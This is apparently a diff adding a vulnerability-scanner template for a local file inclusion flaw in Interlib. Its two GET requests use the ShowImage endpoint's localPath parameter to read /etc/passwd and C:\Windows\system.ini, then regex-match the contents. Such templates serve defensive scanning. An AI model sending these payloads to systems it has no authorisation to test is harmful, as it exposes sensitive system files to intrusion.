@@ -1,0 +1,34 @@
+id: interlib-fileread
+
+info:
+  name: Interlib - Local File Inclusion
+  author: xc
+  severity: high
+  description: Interlib is vulnerable to local file inclusion.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 2
+  tags: interlib,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/interlib/report/ShowImage?localPath=etc/passwd"
+      - "{{BaseURL}}/interlib/report/ShowImage?localPath=C:\\Windows\\system.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "for 16-bit app support"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4b0a00483046022100e51480cf6e623bd071dae3ea06cf4834e108e5bc0485436ee23a23b21f1526ef02210084bfa69e9ddb074e9cfb60895f24bbcedc78c56e52ae0c67464d1bc7ab744f98:922c64590222798bb761d5b6d8e72950
